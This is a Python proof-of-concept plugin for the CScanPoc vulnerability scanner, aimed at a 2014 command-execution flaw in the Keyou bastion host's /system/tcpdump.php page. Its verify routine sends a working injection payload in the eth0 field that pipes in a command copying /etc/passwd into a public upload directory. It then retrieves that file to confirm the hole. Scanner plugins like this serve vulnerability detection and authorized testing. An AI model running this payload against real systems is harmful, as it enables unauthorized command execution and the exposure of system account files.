# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urlparse
import time

class Vuln(ABVuln):
    vuln_id = 'Keyou_0011' # 平台漏洞编号，留空
    name = '江南科友堡垒机 命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2014-09-21'  # 漏洞公布时间
    desc = '''  
        江南科友运维安全审计系统（HAC）在 /system/tcpdump.php 页面命令执行漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '江南科友堡垒机'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'a015f078-6355-4406-81e3-6a63e77f339a'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            arg = self.target
            path = '/system/tcpdump.php'
            raw = '''
POST /system/tcpdump.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 111

op_type=downloadcatch&eth0=1 | cp /etc/passwd /usr/local/apache2/htdocs/project/www/upload/bug.txt | 1&dump=
            '''
            target = arg + path
            code, head, res, errcode, _ = hh.http(target,raw=raw)
            target = arg + '/upload/bug.txt'
            code, head, res, errcode, _ = hh.http(target)
            if code == 200 and ('root:x:' in res) and ('hacuser:x' in res):
                #security_hole(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
